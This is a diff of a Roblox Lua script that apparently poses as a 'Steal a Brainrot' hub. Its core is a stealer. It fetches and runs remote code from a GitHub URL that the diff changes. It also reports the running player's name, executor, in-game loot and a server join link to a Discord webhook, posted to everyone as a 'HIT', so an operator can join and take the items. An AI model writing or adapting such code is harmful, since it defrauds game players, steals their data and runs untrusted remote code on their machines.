@@ -26,7 +26,7 @@ end
 local config = {}
 do
     local ok, res = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/nguyentuongthanh172-ship-it/Config/refs/heads/main/1"))()
     end)
     if ok and type(res) == "table" then
         config = res
@@ -214,10 +214,6 @@ local function detectExecutor()
     return executor
 end
 
-local function getAccountAge()
-    return player and player.AccountAge or 0
-end
-
 local map = Workspace:FindFirstChild("Map")
 local serverType = "UNKNOWN"
 if map then
@@ -277,13 +273,12 @@ local function sendWebhook(link)
               ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
                           "\nReceiver: ".. receiverList ..
                           "\nExecutor: " .. detectExecutor() ..
-                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
     }
     local payload = {
-        ["content"] = "📣 @everyone **HIT KÌA MẤY EM IU**\n" .. (link or ("Server detected: " .. serverType)),
+        ["content"] = "📣 @everyone **HIT KÌA MẤY EM**\n" .. (link or ("Server detected: " .. serverType)),
         ["embeds"] = {embed},
         ["allowed_mentions"] = { ["parse"] = {"everyone"} }
     }
@@ -310,7 +305,7 @@ else
     local playerGui = player and player:WaitForChild("PlayerGui")
     if playerGui then
         local screenGui = Instance.new("ScreenGui", playerGui)
-        screenGui.Name = "StealBrainrotGUI"
+        screenGui.Name = "StealABrainrotHUB"
         screenGui.ResetOnSpawn = false
 
         local frame = Instance.new("Frame", screenGui)
